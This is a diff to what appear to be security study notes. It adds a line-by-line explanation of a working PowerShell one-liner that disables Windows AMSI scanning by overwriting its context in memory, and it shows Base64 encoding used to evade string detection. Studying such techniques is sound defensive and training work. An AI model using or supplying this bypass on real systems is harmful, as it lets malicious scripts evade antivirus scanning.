@@ -471,7 +471,7 @@ Frida provides a powerful and flexible framework for dynamic instrumentation, al
 
 	2. Bypass AMSI detection on Powershell command line
 		1. couldn't break up string to bypass in Win11 (eg 'am'+'siutils')
-		2. Could use Base64 encoding to bypass
+		2. Could use Base64 encoding to bypass 7
 ```powershell
 [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaXR1aWxzCg=="))
 ```
@@ -623,6 +623,58 @@ In the above image, the contents of AMSI Header value was overwritten.
 ```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
+
+
+### Step-by-Step Breakdown:
+
+1. **Retrieve All Types in the Assembly**:
+   ```powershell
+   $a=[Ref].Assembly.GetTypes();
+   ```
+   This line gets all types from the current assembly that the PowerShell script is running in. It does this by calling `GetTypes()` on the assembly retrieved from `[Ref].Assembly`. The `Ref` keyword is used as a placeholder for reflection-based actions, though it may not point to the correct assembly directly unless specified.
+
+2. **Iterate Through Types and Find a Type Whose Name Matches `*iUtils`**:
+   ```powershell
+   Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
+   ```
+   This loop iterates through all the types retrieved from the assembly (`$a`), checking if the type's name contains the string `"iUtils"`. If a match is found, it stores the type information in the `$c` variable.
+
+3. **Get All Non-Public, Static Fields of the Matched Type**:
+   ```powershell
+   $d=$c.GetFields('NonPublic,Static');
+   ```
+   Once the type is found (`$c`), this line retrieves all fields that are non-public and static (usually private or protected static fields). This method call is using reflection to access fields that wouldn't normally be accessible in standard code execution.
+
+4. **Iterate Through Fields and Find One Whose Name Matches `*Context`**:
+   ```powershell
+   Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
+   ```
+   This loop goes through the fields found in the previous step (`$d`), looking for one with a name that contains the string `"Context"`. The field that matches is stored in the `$f` variable.
+
+5. **Get the Value of the Context Field**:
+   ```powershell
+   $g=$f.GetValue($null);
+   ```
+   This uses reflection again to get the value of the matched field (`$f`). The `$null` argument is passed because the field is static, meaning it doesn't belong to an instance of a class. The field value (`$g`) is expected to hold some important data, which could be an object, a pointer, or some application context.
+
+6. **Cast the Field Value to `IntPtr`**:
+   ```powershell
+   [IntPtr]$ptr=$g;
+   ```
+   Here, the value retrieved from the field is cast to an `IntPtr`. This suggests that the field value is likely a pointer (memory address), which could be referencing a block of memory or a handle to some resource.
+
+7. **Prepare a Buffer to Write**:
+   ```powershell
+   [Int32[]]$buf = @(0);
+   ```
+   This creates a buffer containing a single element, `0`, of type `Int32`. This buffer will be used for writing to memory.
+
+8. **Write the Buffer to the Memory Location**:
+   ```powershell
+   [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+   ```
+   This line uses the `Marshal.Copy` method from `System.Runtime.InteropServices` to copy the content of the `$buf` (which contains just `0`) to the memory location pointed to by `$ptr`. The `0` indicates the starting index of the array, and the `1` specifies that one element (in this case, the single `0`) should be written.
+
 
 #### 7.3.2.1
 
